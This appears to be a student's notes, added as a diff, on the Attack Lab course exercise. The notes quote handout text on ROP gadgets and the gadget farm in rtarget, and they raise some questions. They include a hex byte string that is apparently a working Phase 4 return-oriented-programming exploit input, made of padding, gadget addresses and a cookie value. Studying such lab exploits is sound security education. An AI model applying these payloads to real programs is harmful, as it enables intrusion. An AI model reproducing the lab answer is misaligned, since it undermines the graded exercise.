@@ -1,0 +1,39 @@
+> You can construct your solution using gadgets consisting of the following instruction types,
+and using only the first eight x86-64 registers (%rax–%rdi).
+
+
+
+movq : The codes for these are shown in Figure 3A.
+popq : The codes for these are shown in Figure 3B.
+ret : This instruction is encoded by the single byte 0xc3.
+nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single
+byte 0x90. Its only effect is to cause the program counter to be incremented by 1.
+
+
+
+how to ensure that we won't use other instruction?
+
+
+
+
+
+
+
+> All the gadgets you need can be found in the region of the code for rtarget demarcated by the
+functions start_farm and mid_farm.
+
+could we use some instructions in other functions?
+
+here is an example. (Phase 4)
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1b 14 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+ec 17 40 00 00 00 00 00
+
+
+You can do this attack with just two gadgets. (?????)
